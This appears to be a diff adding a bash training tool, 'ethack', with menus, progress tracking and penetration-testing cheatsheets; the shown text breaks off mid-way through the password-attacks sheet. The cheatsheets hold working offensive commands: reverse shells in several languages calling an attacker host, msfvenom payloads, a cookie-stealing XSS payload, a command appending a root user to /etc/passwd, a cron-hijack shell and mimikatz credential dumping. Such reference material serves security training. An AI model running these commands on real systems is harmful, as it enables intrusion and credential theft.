@@ -1,0 +1,1344 @@
+#!/usr/bin/env bash
+# ethack - Interactive Ethical Hacking Training & Reference Tool
+# Navigate with arrow keys or number keys. Press q/ESC/Backspace to go back.
+
+# Requires: bash 4+, tput, python3 (for progress persistence)
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SETUP
+# ─────────────────────────────────────────────────────────────────────────────
+VERSION="1.0.0"
+DATA_DIR="${HOME}/.ethack"
+PROGRESS_FILE="${DATA_DIR}/progress.json"
+LAB_LOG="${DATA_DIR}/labs.log"
+NOTES_DIR="${DATA_DIR}/notes"
+
+mkdir -p "${DATA_DIR}" "${NOTES_DIR}"
+
+[[ ! -f "${PROGRESS_FILE}" ]] && cat >"${PROGRESS_FILE}" <<'EOF'
+{"modules":{"recon":false,"scanning":false,"web":false,"network":false,"exploitation":false,"post":false,"privesc_lin":false,"privesc_win":false,"password":false,"pivoting":false,"bufferoverflow":false,"reporting":false},"labs":0}
+EOF
+[[ ! -f "${LAB_LOG}" ]] && touch "${LAB_LOG}"
+
+# ─────────────────────────────────────────────────────────────────────────────
+# COLORS & TERMINAL
+# ─────────────────────────────────────────────────────────────────────────────
+RED=$'\033[0;31m';    BRED=$'\033[1;31m'
+GREEN=$'\033[0;32m';  BGREEN=$'\033[1;32m'
+YELLOW=$'\033[1;33m'; BYELLOW=$'\033[1;33m'
+BLUE=$'\033[0;34m';   BBLUE=$'\033[1;34m'
+CYAN=$'\033[0;36m';   BCYAN=$'\033[1;36m'
+MAGENTA=$'\033[0;35m';BMAGENTA=$'\033[1;35m'
+WHITE=$'\033[0;37m';  BWHITE=$'\033[1;37m'
+DIM=$'\033[2m';       BOLD=$'\033[1m'
+RESET=$'\033[0m'
+
+COLS=$(tput cols 2>/dev/null || echo 80)
+ROWS=$(tput lines 2>/dev/null || echo 24)
+
+hide_cursor()   { tput civis 2>/dev/null || true; }
+show_cursor()   { tput cnorm 2>/dev/null || true; }
+clear_screen()  { printf '\033[2J\033[H'; }
+move_to()       { printf '\033[%d;%dH' "$1" "$2"; }
+save_pos()      { printf '\033[s'; }
+restore_pos()   { printf '\033[u'; }
+
+# On exit, restore terminal
+cleanup() {
+  show_cursor
+  tput rmcup 2>/dev/null || true
+  echo ""
+}
+trap cleanup EXIT INT TERM
+
+# ─────────────────────────────────────────────────────────────────────────────
+# HELPERS
+# ─────────────────────────────────────────────────────────────────────────────
+center_text() {
+  local text="$1" width="${2:-${COLS}}"
+  # strip color codes for length calculation
+  local plain; plain=$(echo "$text" | sed 's/\x1b\[[0-9;]*m//g')
+  local len=${#plain}
+  local pad=$(( (width - len) / 2 ))
+  printf "%*s%s\n" "$pad" "" "$text"
+}
+
+hline() {
+  local char="${1:─}" width="${2:-${COLS}}"
+  printf '%*s\n' "$width" '' | tr ' ' "${char}"
+}
+
+hline_color() {
+  local char="${1}" color="${2}" width="${3:-${COLS}}"
+  printf "${color}"
+  printf '%*s' "$width" '' | tr ' ' "${char}"
+  printf "${RESET}\n"
+}
+
+draw_box() {
+  # draw_box <row> <col> <height> <width> <color>
+  local row=$1 col=$2 h=$3 w=$4 color="${5:-$CYAN}"
+  local i
+  move_to $row $col; printf "${color}┌"; printf '─%.0s' $(seq 1 $((w-2))); printf "┐${RESET}"
+  for (( i=1; i<h-1; i++ )); do
+    move_to $((row+i)) $col; printf "${color}│${RESET}"; printf '%*s' $((w-2)) ''; printf "${color}│${RESET}"
+  done
+  move_to $((row+h-1)) $col; printf "${color}└"; printf '─%.0s' $(seq 1 $((w-2))); printf "┘${RESET}"
+}
+
+print_header() {
+  local title="${1}" subtitle="${2:-}"
+  clear_screen
+  printf "\n"
+  center_text "${BBLUE}╔══════════════════════════════════════════════════════════════╗${RESET}"
+  center_text "${BBLUE}║${RESET}  ${BRED}▓▒░${RESET} ${BWHITE}ETHACK${RESET} ${CYAN}─ Interactive Ethical Hacking Trainer${RESET}  ${BRED}░▒▓${RESET}  ${BBLUE}║${RESET}"
+  center_text "${BBLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
+  if [[ -n "$title" ]]; then
+    printf "\n"
+    center_text "${BYELLOW}◈  ${BWHITE}${title}${RESET}  ${BYELLOW}◈${RESET}"
+    [[ -n "$subtitle" ]] && center_text "${DIM}${subtitle}${RESET}"
+  fi
+  printf "\n"
+}
+
+# Read a single keypress, including arrow keys
+# Sets global KEY variable
+read_key() {
+  local k1 k2 k3
+  IFS= read -rsn1 k1
+  KEY="$k1"
+  if [[ "$k1" == $'\x1b' ]]; then
+    IFS= read -rsn1 -t 0.1 k2 || true
+    if [[ "$k2" == '[' ]]; then
+      IFS= read -rsn1 -t 0.1 k3 || true
+      KEY="ESC[${k3}"
+    elif [[ -z "$k2" ]]; then
+      KEY="ESC"
+    fi
+  fi
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# INTERACTIVE MENU ENGINE
+# Returns selected index in global MENU_RESULT (0-based)
+# Returns -1 if user pressed Back/Quit
+# ─────────────────────────────────────────────────────────────────────────────
+interactive_menu() {
+  local title="$1"
+  local subtitle="$2"
+  shift 2
+  local items=("$@")
+  local count=${#items[@]}
+  local selected=0
+
+  hide_cursor
+  while true; do
+    print_header "$title" "$subtitle"
+
+    local i
+    for (( i=0; i<count; i++ )); do
+      local prefix icon label
+      # Extract icon prefix if present (format: "ICON|Label")
+      if [[ "${items[$i]}" == *"|"* ]]; then
+        icon="${items[$i]%%|*}"
+        label="${items[$i]#*|}"
+      else
+        icon="  "
+        label="${items[$i]}"
+      fi
+
+      if (( i == selected )); then
+        center_text "  ${BBLUE}▶${RESET} ${BWHITE}${icon}${RESET} ${BGREEN}${label}${RESET}  ${BBLUE}◀${RESET}"
+      else
+        center_text "    ${CYAN}${icon}${RESET} ${WHITE}${label}${RESET}"
+      fi
+    done
+
+    printf "\n"
+    center_text "${DIM}↑↓ navigate  ·  Enter select  ·  q / ESC back${RESET}"
+    printf "\n"
+
+    read_key
+
+    case "$KEY" in
+      "ESC[A"|$'\x1b'[A)   # Up arrow
+        (( selected = (selected - 1 + count) % count )) ;;
+      "ESC[B"|$'\x1b'[B)   # Down arrow
+        (( selected = (selected + 1) % count )) ;;
+      ""|$'\n'|$'\r')  # Enter
+        MENU_RESULT=$selected
+        return 0 ;;
+      [0-9])  # Number shortcut
+        local n=$(( KEY - 1 ))
+        if (( n >= 0 && n < count )); then
+          MENU_RESULT=$n
+          return 0
+        fi ;;
+      q|Q|"ESC"|$'\x7f'|$'\x08')  # q, ESC, backspace
+        MENU_RESULT=-1
+        return 0 ;;
+    esac
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# PAGER - display text content with scroll support
+# ─────────────────────────────────────────────────────────────────────────────
+pager() {
+  local title="$1"; shift
+  local lines=("$@")
+  local total=${#lines[@]}
+  local visible=$(( ROWS - 8 ))
+  (( visible < 5 )) && visible=5
+  local offset=0
+
+  hide_cursor
+  while true; do
+    print_header "$title"
+    hline_color "─" "${DIM}" "$COLS"
+
+    local i end=$(( offset + visible ))
+    (( end > total )) && end=$total
+    for (( i=offset; i<end; i++ )); do
+      printf "  %s\n" "${lines[$i]}"
+    done
+
+    # Fill remaining lines
+    local shown=$(( end - offset ))
+    local fill=$(( visible - shown ))
+    for (( i=0; i<fill; i++ )); do printf "\n"; done
+
+    hline_color "─" "${DIM}" "$COLS"
+    local pct=0
+    (( total > 0 )) && pct=$(( (offset + visible) * 100 / total ))
+    (( pct > 100 )) && pct=100
+    center_text "${DIM}↑↓/PgUp/PgDn scroll  ·  q / ESC back  ·  ${pct}%  ($(( offset+1 ))–${end}/${total})${RESET}"
+
+    read_key
+    case "$KEY" in
+      "ESC[A"|k)  (( offset > 0 )) && (( offset-- )) ;;
+      "ESC[B"|j)  (( offset + visible < total )) && (( offset++ )) ;;
+      "ESC[5")  # PgUp
+        (( offset -= visible )); (( offset < 0 )) && offset=0 ;;
+      "ESC[6")  # PgDn
+        (( offset += visible ))
+        (( offset + visible > total )) && offset=$(( total - visible ))
+        (( offset < 0 )) && offset=0 ;;
+      g|"ESC[H")  offset=0 ;;
+      "G"|"ESC[F")  offset=$(( total - visible )); (( offset < 0 )) && offset=0 ;;
+      q|Q|"ESC"|$'\x7f'|$'\x08') return ;;
+    esac
+  done
+}
+
+# Helper: run pager with a heredoc string
+show_content() {
+  local title="$1" content="$2"
+  local -a lines
+  while IFS= read -r line; do
+    lines+=("$line")
+  done <<< "$content"
+  pager "$title" "${lines[@]}"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# PROGRESS
+# ─────────────────────────────────────────────────────────────────────────────
+get_progress_val() {
+  python3 -c "
+import json, sys
+try:
+    d = json.load(open('${PROGRESS_FILE}'))
+    print(d['modules'].get('$1', False))
+except: print('False')
+" 2>/dev/null
+}
+
+set_progress_val() {
+  python3 -c "
+import json
+d = json.load(open('${PROGRESS_FILE}'))
+d['modules']['$1'] = $2
+json.dump(d, open('${PROGRESS_FILE}','w'), indent=2)
+" 2>/dev/null
+}
+
+get_labs() {
+  python3 -c "import json; d=json.load(open('${PROGRESS_FILE}')); print(d.get('labs',0))" 2>/dev/null || echo "0"
+}
+
+inc_labs() {
+  python3 -c "
+import json
+d = json.load(open('${PROGRESS_FILE}'))
+d['labs'] = d.get('labs',0) + 1
+json.dump(d, open('${PROGRESS_FILE}','w'), indent=2)
+" 2>/dev/null
+}
+
+show_progress_screen() {
+  local modules=("recon" "scanning" "web" "network" "exploitation" "post"
+                 "privesc_lin" "privesc_win" "password" "pivoting" "bufferoverflow" "reporting")
+  local labels=("Reconnaissance" "Scanning & Enumeration" "Web Attacks" "Network Attacks"
+                "Exploitation" "Post-Exploitation" "Linux Privilege Escalation"
+                "Windows Privilege Escalation" "Password Attacks" "Pivoting & Tunneling"
+                "Buffer Overflow" "Report Writing")
+  local total=${#modules[@]}
+  local done_count=0
+  local -a status_vals
+
+  for m in "${modules[@]}"; do
+    local v; v=$(get_progress_val "$m")
+    status_vals+=("$v")
+    [[ "$v" == "True" ]] && (( done_count++ )) || true
+  done
+
+  local labs; labs=$(get_labs)
+  local pct=0
+  (( total > 0 )) && pct=$(( done_count * 100 / total ))
+
+  print_header "Training Progress" "Track your OSCP module completion"
+
+  local i
+  for (( i=0; i<total; i++ )); do
+    local col row_label
+    row_label="${labels[$i]}"
+    if [[ "${status_vals[$i]}" == "True" ]]; then
+      col="${BGREEN}"
+      center_text "  ${BGREEN}[✓]${RESET} ${col}${row_label}${RESET}"
+    else
+      center_text "  ${RED}[ ]${RESET} ${WHITE}${row_label}${RESET}"
+    fi
+  done
+
+  printf "\n"
+  # Progress bar
+  local bar="" filled=$(( pct / 5 ))
+  for (( i=0; i<20; i++ )); do
+    if (( i < filled )); then bar+="${BGREEN}█${RESET}"; else bar+="${DIM}░${RESET}"; fi
+  done
+  center_text "Progress: [${bar}] ${BYELLOW}${pct}%${RESET}  (${done_count}/${total} modules)"
+  center_text "${BCYAN}Labs pwned: ${BWHITE}${labs}${RESET}"
+
+  printf "\n"
+  center_text "${DIM}Press m to mark a module complete · q to go back${RESET}"
+  printf "\n"
+
+  while true; do
+    read_key
+    case "$KEY" in
+      m|M)
+        # Pick a module to mark
+        local menu_items=()
+        for (( i=0; i<total; i++ )); do
+          local tick=""
+          [[ "${status_vals[$i]}" == "True" ]] && tick=" ✓"
+          menu_items+=("${labels[$i]}${tick}")
+        done
+        interactive_menu "Mark Module Complete" "Select a module to toggle" "${menu_items[@]}"
+        if (( MENU_RESULT >= 0 )); then
+          local mod="${modules[$MENU_RESULT]}"
+          local cur; cur=$(get_progress_val "$mod")
+          if [[ "$cur" == "True" ]]; then
+            set_progress_val "$mod" "False"
+          else
+            set_progress_val "$mod" "True"
+          fi
+        fi
+        show_progress_screen
+        return ;;
+      q|Q|"ESC"|$'\x7f') return ;;
+    esac
+  done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CHEATSHEETS
+# ─────────────────────────────────────────────────────────────────────────────
+cheatsheet_recon() {
+  show_content "Reconnaissance" "
+${BBLUE}── PASSIVE RECON ──────────────────────────────────────────────${RESET}
+
+  ${CYAN}whois${RESET} <domain>
+  ${CYAN}nslookup${RESET} <domain>
+  ${CYAN}host -t mx${RESET} <domain>
+  ${CYAN}dig any${RESET} <domain> @8.8.8.8
+  ${CYAN}theHarvester${RESET} -d <domain> -b all
+  ${CYAN}amass enum${RESET} -passive -d <domain>
+  ${CYAN}shodan search${RESET} \"org:<OrgName>\"
+
+${BBLUE}── ACTIVE RECON ───────────────────────────────────────────────${RESET}
+
+  ${CYAN}fierce${RESET} --domain <domain>
+  ${CYAN}dnsrecon${RESET} -d <domain> -t axfr
+  ${CYAN}sublist3r${RESET} -d <domain>
+  ${CYAN}gobuster dns${RESET} -d <domain> -w subdomains.txt
+  ${CYAN}dnsx${RESET} -d <domain> -a -cname -txt
+
+${BBLUE}── EMAIL / OSINT ───────────────────────────────────────────────${RESET}
+
+  ${CYAN}theHarvester${RESET} -d <domain> -b linkedin,google,bing
+  ${CYAN}hunter.io${RESET}  /  ${CYAN}phonebook.cz${RESET}  /  ${CYAN}intelx.io${RESET}
+  ${CYAN}maltego${RESET} (graph-based OSINT)
+
+${BBLUE}── GOOGLE DORKS ───────────────────────────────────────────────${RESET}
+
+  site:<domain> filetype:pdf
+  site:<domain> inurl:admin
+  site:<domain> intitle:\"index of\"
+  \"<org>\" filetype:xls OR filetype:xlsx
+  inurl:\"/phpinfo.php\"
+  intext:\"sql syntax near\" site:<domain>
+"
+}
+
+cheatsheet_scanning() {
+  show_content "Scanning & Enumeration" "
+${BBLUE}── NMAP ESSENTIALS ─────────────────────────────────────────────${RESET}
+
+  ${CYAN}nmap -sn${RESET} 10.10.10.0/24                         # Host discovery
+  ${CYAN}nmap -sC -sV -oA initial${RESET} <ip>                 # Default enum
+  ${CYAN}nmap -p-${RESET} --min-rate 5000 -oA allports <ip>    # All ports
+  ${CYAN}nmap -sU${RESET} --top-ports 20 <ip>                  # UDP top 20
+  ${CYAN}nmap --script vuln${RESET} <ip>                        # Vuln scripts
+
+${BBLUE}── SERVICE FINGERPRINTING ───────────────────────────────────────${RESET}
+
+  ${CYAN}banner grab:${RESET}   nc -nv <ip> <port>
+  ${CYAN}whatweb${RESET} http://<ip>
+  ${CYAN}curl -I${RESET} http://<ip>
+  ${CYAN}smbclient -L${RESET} //<ip> -N
+  ${CYAN}enum4linux -a${RESET} <ip>
+
+${BBLUE}── AUTORECON (recommended) ─────────────────────────────────────${RESET}
+
+  ${CYAN}autorecon${RESET} <ip>                                 # All-in-one recon
+  ${CYAN}autorecon${RESET} <ip> --only-scans-dir
+
+${BBLUE}── OUTPUT FORMATS ───────────────────────────────────────────────${RESET}
+
+  -oN normal.txt   -oX xml.txt   -oG grep.txt   -oA all
+"
+}
+
+cheatsheet_web() {
+  show_content "Web Attacks" "
+${BBLUE}── DIRECTORY/FILE FUZZING ──────────────────────────────────────${RESET}
+
+  ${CYAN}gobuster dir${RESET} -u http://<ip> -w common.txt -x php,txt,html
+  ${CYAN}ffuf${RESET} -u http://<ip>/FUZZ -w directory-list-2.3-medium.txt
+  ${CYAN}feroxbuster${RESET} -u http://<ip> -w <wordlist> --depth 3
+
+${BBLUE}── VHOST / SUBDOMAIN ────────────────────────────────────────────${RESET}
+
+  ${CYAN}ffuf${RESET} -u http://<ip> -H \"Host: FUZZ.<domain>\" -w subdomains.txt -fs <size>
+  ${CYAN}gobuster vhost${RESET} -u http://<domain> -w subdomains.txt
+
+${BBLUE}── SQL INJECTION ─────────────────────────────────────────────────${RESET}
+
+  Detection:  ' -- ; \" OR 1=1-- ' OR '1'='1
+  ${CYAN}sqlmap${RESET} -u \"http://<ip>/page?id=1\" --dbs --batch
+  ${CYAN}sqlmap${RESET} -r request.txt --level=5 --risk=3
+  ${CYAN}sqlmap${RESET} -u \"...\" --os-shell
+
+  Manual UNION:
+    ' ORDER BY 3--
+    ' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+
+${BBLUE}── FILE INCLUSION ───────────────────────────────────────────────${RESET}
+
+  LFI:  ?page=../../../etc/passwd
+        ?page=....//....//etc/passwd
+        ?page=php://filter/convert.base64-encode/resource=/etc/passwd
+  RFI:  ?page=http://<attacker>/shell.php
+
+${BBLUE}── XSS ─────────────────────────────────────────────────────────${RESET}
+
+  <script>alert(1)</script>
+  <img src=x onerror=alert(1)>
+  \"><script>document.location='http://<attacker>/'+document.cookie</script>
+  ${CYAN}dalfox${RESET} url \"http://<ip>/page?q=test\"
+
+${BBLUE}── COMMAND INJECTION ───────────────────────────────────────────${RESET}
+
+  ; id        | id        \`id\`        \$(id)
+  ; ls -la    && cat /etc/passwd
+  ${CYAN}commix${RESET} -u \"http://<ip>/page?cmd=test\"
+
+${BBLUE}── WORDPRESS ───────────────────────────────────────────────────${RESET}
+
+  ${CYAN}wpscan${RESET} --url http://<ip> --enumerate p,t,u
+  ${CYAN}wpscan${RESET} --url http://<ip> -U users.txt -P rockyou.txt
+"
+}
+
+cheatsheet_network() {
+  show_content "Network Attacks" "
+${BBLUE}── SMB ─────────────────────────────────────────────────────────${RESET}
+
+  ${CYAN}smbclient${RESET} -L //<ip> -N
+  ${CYAN}smbmap${RESET} -H <ip>
+  ${CYAN}enum4linux -a${RESET} <ip>
+  ${CYAN}crackmapexec smb${RESET} <ip> --shares -u '' -p ''
+  ${CYAN}rpcclient${RESET} -U \"\" -N <ip>  →  enumdomusers / queryuser <RID>
+
+  # Mount
+  mount -t cifs //<ip>/<share> /mnt/s -o user=<u>,pass=<p>
+
+${BBLUE}── FTP ─────────────────────────────────────────────────────────${RESET}
+
+  ${CYAN}ftp${RESET} <ip>              (try anonymous:anonymous)
+  ${CYAN}wget -m --no-passive${RESET} ftp://anonymous:anonymous@<ip>
+  ${CYAN}hydra${RESET} -l admin -P rockyou.txt ftp://<ip>
+
+${BBLUE}── SSH ─────────────────────────────────────────────────────────${RESET}
+
+  ${CYAN}ssh-keyscan${RESET} <ip>
+  ${CYAN}ssh${RESET} -i id_rsa user@<ip>
+  # Crack key:
+  ${CYAN}ssh2john${RESET} id_rsa > hash && ${CYAN}john${RESET} hash --wordlist=rockyou.txt
+
+${BBLUE}── LDAP ────────────────────────────────────────────────────────${RESET}
+
+  ${CYAN}ldapsearch${RESET} -x -H ldap://<ip> -b \"DC=domain,DC=local\"
+  ${CYAN}ldapsearch${RESET} -x -H ldap://<ip> -b \"DC=...\" \"(objectClass=user)\" sAMAccountName
+  ${CYAN}bloodhound-python${RESET} -d domain.local -u user -p pass -gc dc.<domain> -c all
+
+${BBLUE}── ACTIVE DIRECTORY ─────────────────────────────────────────────${RESET}
+
+  ${CYAN}kerbrute userenum${RESET} --dc <ip> -d domain.local users.txt
+  ${CYAN}GetNPUsers.py${RESET} domain.local/ -usersfile users.txt -dc-ip <ip>   # AS-REP
+  ${CYAN}GetUserSPNs.py${RESET} domain.local/user:pass -dc-ip <ip> -request     # Kerberoast
+  ${CYAN}crackmapexec smb${RESET} <ip> -u user -p pass --pass-pol
+  ${CYAN}evil-winrm${RESET} -i <ip> -u Administrator -H <NTLM_hash>
+  ${CYAN}impacket-psexec${RESET} domain/user:pass@<ip>
+"
+}
+
+cheatsheet_exploitation() {
+  show_content "Exploitation" "
+${BBLUE}── SEARCHSPLOIT ─────────────────────────────────────────────────${RESET}
+
+  ${CYAN}searchsploit${RESET} <service> <version>
+  ${CYAN}searchsploit${RESET} -x <path/to/exploit>        # View exploit
+  ${CYAN}searchsploit${RESET} -m <path/to/exploit>        # Copy exploit here
+
+${BBLUE}── METASPLOIT ─────────────────────────────────────────────────${RESET}
+
+  msfconsole
+    search <term>
+    use <module>
+    show options
+    set RHOSTS <ip>
+    set LHOST <ip>
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp
+    run / exploit
+
+  msfvenom generators:
+  ${CYAN}msfvenom${RESET} -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o s.exe
+  ${CYAN}msfvenom${RESET} -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o s.elf
+  ${CYAN}msfvenom${RESET} -p php/reverse_php LHOST=<ip> LPORT=4444 -f raw -o s.php
+  ${CYAN}msfvenom${RESET} -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o s.war
+
+${BBLUE}── REVERSE SHELLS ────────────────────────────────────────────${RESET}
+
+  Listener:  ${CYAN}nc -lvnp 4444${RESET}
+             ${CYAN}rlwrap nc -lvnp 4444${RESET}
+
+  Bash:   bash -i >& /dev/tcp/<ip>/4444 0>&1
+  Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'
+  PHP:    php -r '\$s=fsockopen(\"<ip>\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'
+  Perl:   perl -e 'use Socket;\$i=\"<ip>\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'
+  NC:     rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> 4444 > /tmp/f
+
+${BBLUE}── UPGRADE SHELL (TTY) ───────────────────────────────────────${RESET}
+
+  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
+  # Then:  Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm
+  script /dev/null -c bash
+  ${CYAN}socat${RESET} file:\`tty\`,raw,echo=0 TCP:<ip>:4444   # fully interactive
+"
+}
+
+cheatsheet_post() {
+  show_content "Post-Exploitation" "
+${BBLUE}── LINUX ENUM ────────────────────────────────────────────────${RESET}
+
+  ${CYAN}./linpeas.sh${RESET} | tee linpeas.out
+  ${CYAN}./linux-exploit-suggester.sh${RESET}
+  id; whoami; hostname; uname -a
+  cat /etc/passwd /etc/hosts /etc/crontab
+  env; history; cat ~/.bash_history
+
+${BBLUE}── WINDOWS ENUM ──────────────────────────────────────────────${RESET}
+
+  ${CYAN}.\\winPEAS.exe${RESET}
+  ${CYAN}.\\PowerUp.ps1${RESET}; Invoke-AllChecks
+  ${CYAN}.\\Seatbelt.exe${RESET} -group=all
+  whoami /priv /groups
+  systeminfo
+  net user && net localgroup administrators
+  wmic qfe get Caption,HotFixID            # Installed patches
+  schtasks /query /fo LIST /v
+
+${BBLUE}── DATA COLLECTION ──────────────────────────────────────────${RESET}
+
+  # Linux
+  find / -name \"*.txt\" -readable 2>/dev/null | grep -i pass
+  find / -name \"id_rsa\" 2>/dev/null
+  cat ~/.ssh/id_rsa
+  grep -r \"password\" /var/www/ 2>/dev/null
+
+  # Windows
+  findstr /si password *.txt *.ini *.config *.xml
+  dir /s /b *pass* == *cred* == *vnc* == *.config
+  reg query HKLM /f password /t REG_SZ /s
+  type C:\\Users\\*\\AppData\\Roaming\\FileZilla\\recentservers.xml
+
+${BBLUE}── TRANSFERRING FILES ──────────────────────────────────────${RESET}
+
+  # Python HTTP server (attacker)
+  python3 -m http.server 80
+
+  # Linux download
+  wget http://<ip>/file  /  curl -O http://<ip>/file
+
+  # Windows download
+  certutil -urlcache -split -f http://<ip>/file file
+  powershell -c \"(New-Object Net.WebClient).DownloadFile('http://<ip>/f','C:\\\\f')\"
+  iwr -uri http://<ip>/f -outfile f
+
+  # SMB server (attacker)
+  impacket-smbserver share . -smb2support
+  # Windows: copy \\\\<ip>\\\\share\\\\file .
+"
+}
+
+cheatsheet_privesc_lin() {
+  show_content "Linux Privilege Escalation" "
+${BBLUE}── AUTO SCRIPTS ──────────────────────────────────────────────${RESET}
+
+  ${CYAN}./linpeas.sh${RESET}
+  ${CYAN}./linux-exploit-suggester.sh${RESET}
+  ${CYAN}./lse.sh${RESET} -l 2
+
+${BBLUE}── MANUAL CHECKS ─────────────────────────────────────────────${RESET}
+
+  sudo -l                                      # Sudo rights
+  find / -perm -u=s -type f 2>/dev/null        # SUID
+  find / -perm -g=s -type f 2>/dev/null        # SGID
+  getcap -r / 2>/dev/null                      # Capabilities
+  cat /etc/crontab && ls /etc/cron*            # Cron jobs
+  ps aux --forest                              # Processes
+  ss -tlnp                                     # Open ports
+  ls -la /etc/passwd /etc/shadow               # Writable?
+
+${BBLUE}── GTFOBINS (SUID / SUDO ABUSE) ───────────────────────────────${RESET}
+
+  sudo vim     →  :!/bin/sh
+  sudo find    →  sudo find . -exec /bin/sh \\; -quit
+  sudo python3 →  python3 -c 'import os; os.system(\"/bin/sh\")'
+  sudo awk     →  sudo awk 'BEGIN {system(\"/bin/sh\")}'
+  sudo less    →  !sh     (inside less)
+  sudo nano    →  Ctrl+R Ctrl+X then:  reset; sh 1>&0 2>&0
+
+  ${BBLUE}→ Check gtfobins.github.io for every binary!${RESET}
+
+${BBLUE}── CAPABILITIES ─────────────────────────────────────────────${RESET}
+
+  getcap -r / 2>/dev/null
+  # cap_setuid+ep on python3:
+  python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'
+
+${BBLUE}── PASSWD WRITE ──────────────────────────────────────────────${RESET}
+
+  openssl passwd -1 -salt hax hax123
+  echo 'haxroot:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+${BBLUE}── CRON JOB HIJACK ───────────────────────────────────────────${RESET}
+
+  # If cron runs writable script:
+  echo 'bash -i >& /dev/tcp/<ip>/4444 0>&1' >> /path/to/script.sh
+  # Or replace binary in PATH before system dir
+"
+}
+
+cheatsheet_privesc_win() {
+  show_content "Windows Privilege Escalation" "
+${BBLUE}── AUTO SCRIPTS ──────────────────────────────────────────────${RESET}
+
+  ${CYAN}.\\winPEAS.exe${RESET}
+  ${CYAN}.\\PowerUp.ps1${RESET}; Invoke-AllChecks
+  ${CYAN}.\\Seatbelt.exe${RESET} -group=all
+  ${CYAN}SharpUp.exe${RESET} audit
+
+${BBLUE}── TOKEN IMPERSONATION ───────────────────────────────────────${RESET}
+
+  whoami /priv   # Look for SeImpersonatePrivilege
+  ${CYAN}.\\PrintSpoofer.exe${RESET} -i -c cmd
+  ${CYAN}.\\JuicyPotato.exe${RESET} -l 1337 -p cmd.exe -a \"/c whoami\" -t *
+  ${CYAN}.\\GodPotato.exe${RESET} -cmd \"cmd /c whoami\"
+  ${CYAN}.\\RoguePotato.exe${RESET} ...
+
+${BBLUE}── SERVICE EXPLOITS ──────────────────────────────────────────${RESET}
+
+  # Unquoted service path
+  wmic service get name,pathname | findstr /i /v \"C:\\\\Windows\"
+  sc qc <ServiceName>
+
+  # Weak service permissions
+  accesschk.exe -uwcqv <username> *
+  sc config <svc> binPath= \"cmd /c net localgroup administrators <user> /add\"
+  sc start <svc>
+
+${BBLUE}── REGISTRY ──────────────────────────────────────────────────${RESET}
+
+  # AlwaysInstallElevated
+  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+  msfvenom -p windows/adduser USER=hax PASS=Hax123! -f msi -o evil.msi
+  msiexec /quiet /qn /i evil.msi
+
+${BBLUE}── PASS-THE-HASH ─────────────────────────────────────────────${RESET}
+
+  ${CYAN}evil-winrm${RESET} -i <ip> -u Administrator -H <NTLM>
+  ${CYAN}crackmapexec smb${RESET} <ip> -u Admin -H <NTLM>
+  ${CYAN}impacket-psexec${RESET} Admin@<ip> -hashes :<NTLM>
+
+${BBLUE}── MIMIKATZ ──────────────────────────────────────────────────${RESET}
+
+  privilege::debug
+  sekurlsa::logonpasswords
+  lsadump::sam
+  lsadump::dcsync /user:Administrator
+"
+}
+
+cheatsheet_password() {
+  show_content "Password Attacks" "
+${BBLUE}── HASH IDENTIFICATION ───────────────────────────────────────${RESET}
+
+  ${CYAN}hashid${RESET} <hash>      /    ${CYAN}hash-identifier${RESET}
+  ${CYAN}name-that-hash${RESET} <hash>
+
+${BBLUE}── HASHCAT ───────────────────────────────────────────────────${RESET}
+
+  ${CYAN}hashcat${RESET} -m 0    hash.txt rockyou.txt      # MD5
+  ${CYAN}hashcat${RESET} -m 1000 hash.txt rockyou.txt      # NTLM
+  ${CYAN}hashcat${RESET} -m 1800 hash.txt rockyou.txt      # SHA-512crypt
+  ${CYAN}hashcat${RESET} -m 500  hash.txt rockyou.txt      # MD5crypt
+  ${CYAN}hashcat${RESET} -m 13100 hash.txt rockyou.txt     # Kerberoast TGS
+  ${CYAN}hashcat${RESET} -m 18200 hash.txt rockyou.txt     # AS-REP
+  ${CYAN}hashcat${RESET} -m 22921 id_rsa.hash rockyou.txt  # SSH private key
+
+  Rules: -r /usr/share/hashcat/rules/best64.rule
+         -r /usr/share/hashcat/rules/dive.rule
+
+${BBLUE}── JOHN THE RIPPER ───────────────────────────────────────────${RESET}
+
+  ${CYAN}john${RESET} --wordlist=rockyou.txt hash.txt
+  ${CYAN}john${RESET} --wordlist=rockyou.txt --rules hash.txt
+  ${CYAN}john${RESET} --show hash.txt
+  ${CYAN}ssh2john${RESET} id_rsa > id_rsa.hash
+  ${CYAN}zip2john${RESET} file.zip > zip.hash
+  ${CYAN}keepass2john${RESET} db.kdbx > keepass.hash
+
+${BBLUE}── NETWORK BRUTEFORCE ────────────────────────────────────────${RESET}
+
+  ${CYAN}hydra${RESET} -l admin -P rockyou.txt <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"
+  ${CYAN}hydra${RESET} -l root -P rockyou.txt ssh://<ip>
+  ${CYAN}hydra${RESET} -L users.txt -P rockyou.txt smb://<ip>
+  ${CYAN}crackmapexec ssh${RESET} <ip> -u user -p rockyou.txt
+  ${CYAN}medusa${RESET} -h <ip> -u admin -P rockyou.txt -M http
+
